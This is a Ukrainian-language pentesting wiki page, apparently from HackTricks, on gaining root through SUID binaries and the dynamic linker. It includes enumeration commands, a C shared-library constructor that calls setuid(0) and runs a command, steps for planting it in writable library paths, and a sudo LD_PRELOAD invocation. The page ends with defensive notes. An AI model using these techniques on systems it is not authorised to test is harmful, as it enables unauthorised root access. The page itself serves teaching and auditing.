# Зловживання SUID Shared Library та Linker

{{#include ../../banners/hacktricks-training.md}}

SUID-бінарні файли зазвичай перевіряють на можливість прямого виконання команд, але власні SUID-програми також можуть бути вразливими через dynamic linker. Спільна риса проста: привілейований executable завантажує code із path або configuration, на які користувач із нижчими привілеями може впливати.

Ця сторінка зосереджена на загальних patterns технік: відсутні libraries, writable library directories, `RPATH`/`RUNPATH`, `LD_PRELOAD` через sudo, linker configuration і плутанина із SUID hardlink.

## Швидке перерахування

Почніть із пошуку незвичних SUID-файлів і перевірки, чи використовують вони dynamic linking:
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
Зосередьтеся на нестандартних розташуваннях, шляхах до custom application, бінарних файлах, власником яких є root, але які розташовані за межами каталогів, якими керує package manager, а також залежностях, що завантажуються із доступних для запису каталогів.

Корисні перевірки доступності для запису:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Missing Shared Object Injection

Деякі custom SUID binaries намагаються завантажити shared object, якого не існує. Якщо відсутній шлях розташований у директорії, контрольованій attacker, binary може завантажити код, наданий attacker, з правами effective user.

Знайдіть невдалі пошуки library:
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
Якщо бінарний файл шукає `libexample.so` у доступному для запису шляху, мінімальна бібліотека для підтвердження впливу може використовувати constructor. Під час перевірки підтвердження впливу має залишатися нешкідливим:
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
Зберіть його з точною назвою файлу, який намагається завантажити бінарний файл:
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
Експлуатованою умовою є не лише відсутня library. Зловмисник повинен мати змогу розмістити сумісний shared object за шляхом, який привілейований loader прийме.

## Writable Library Directory

Іноді всі dependencies існують, але один із каталогів, що використовуються для їх розв’язання, доступний для запису. Це може дозволити замінити завантажену library або розмістити library з вищим пріоритетом із таким самим іменем.

Перевірте шляхи dependencies:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
Якщо директорія доступна для запису, перевірте це в лабораторному середовищі безпечним підходом із копією. Заміна системних бібліотек на робочому хості може порушити автентифікацію, керування пакетами або критично важливі для завантаження служби.

## RPATH і RUNPATH

`RPATH` і `RUNPATH` — це записи dynamic section, які вказують loader, де шукати бібліотеки. Вони небезпечні у SUID-програмах, якщо вказують на директорії, доступні атакувальнику для запису.

Виявлення:
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
Приклад небезпечного виводу:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
Якщо `/opt/app/lib` доступний для запису, а бінарний файл потребує `libcustom.so`, зловмисник може розмістити там шкідливий `libcustom.so`:
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` і `RUNPATH` не є ідентичними щодо всіх деталей resolution, але під час перевірки privilege-escalation практичне питання залишається тим самим: чи шукає SUID binary бібліотеку за її назвою в директорії, доступній для запису attacker'у?

## LD_PRELOAD, LD_LIBRARY_PATH і SUID

Для звичайних програм `LD_PRELOAD` і `LD_LIBRARY_PATH` можуть примусово виконувати або змінювати завантаження shared object. Для SUID-програм dynamic loader зазвичай переходить у secure-execution mode та ігнорує небезпечні змінні середовища.

Це означає, що звичайний SUID binary зазвичай не є вразливим лише через те, що користувач може встановити `LD_PRELOAD`:
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
Поширеним винятком є неправильне налаштування sudo. Якщо `sudo -l` показує, що зберігається така змінна, як `LD_PRELOAD` або `LD_LIBRARY_PATH`, команда, дозволена через sudo, може завантажити код під контролем атакувальника:
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
Не плутайте ці випадки:

- `LD_PRELOAD` проти звичайного SUID binary: зазвичай блокується режимом secure execution.
- `LD_PRELOAD`, збережений sudo: потенційно exploitable.
- Відсутній `.so` у writable path: exploitable, якщо SUID binary природним чином завантажує цей шлях.
- `RPATH`/`RUNPATH`, що вказує на writable directory: exploitable, якщо потрібною library можна керувати.
- Доступ на запис до `/etc/ld.so.preload` або конфігурації linker: загальносистемний і має високий вплив.

## Конфігурація linker

Dynamic linker також читає системну конфігурацію, зокрема `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, linker cache і, у деяких випадках, `/etc/ld.so.preload`.

Перевірки з високою цінністю:
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
Конфігурація linker зазвичай є серйознішою проблемою, ніж один вразливий SUID-бінарник, оскільки вона може впливати на багато динамічно зв’язаних процесів. `/etc/ld.so.preload` особливо небезпечний, оскільки може примусово завантажувати shared object у привілейовані процеси.

## SUID Hardlink Confusion

Hardlink можуть створити видимість одного й того самого SUID inode під кількома іменами. Це корисно для приховування привілейованого helper, введення в оману під час очищення або обходу наївної перевірки шляхів.

Знайдіть SUID-файли, які мають більше одного link:
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
Перевірте всі шляхи до того самого inode:
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
Зловживання полягає не в тому, що hardlink змінює дозволи. Зловживання полягає в плутанині шляхів: привілейований inode може бути доступним через ім’я, якого не очікують захисники або скрипти. Докладніші відомості про inode та workflow роботи з hardlink див. у [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md).

## Defensive Notes

- Зводьте SUID-бінарні файли до мінімуму, проводьте їх аудит і, за можливості, керуйте ними через пакетний менеджер.
- Уникайте записів `RPATH`/`RUNPATH`, що вказують на доступні для запису каталоги або каталоги, якими керують застосунки.
- Каталоги бібліотек мають належати root і бути недоступними для запису звичайним користувачам.
- Не зберігайте `LD_PRELOAD`, `LD_LIBRARY_PATH` або подібні змінні loader через sudo.
- Відстежуйте `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` і неочікувані SUID-файли.
- Перевіряйте SUID-файли, пов’язані через hardlink, і розслідуйте призначені для користувача SUID-обгортки поза стандартними системними шляхами.

{{#include ../../banners/hacktricks-training.md}}
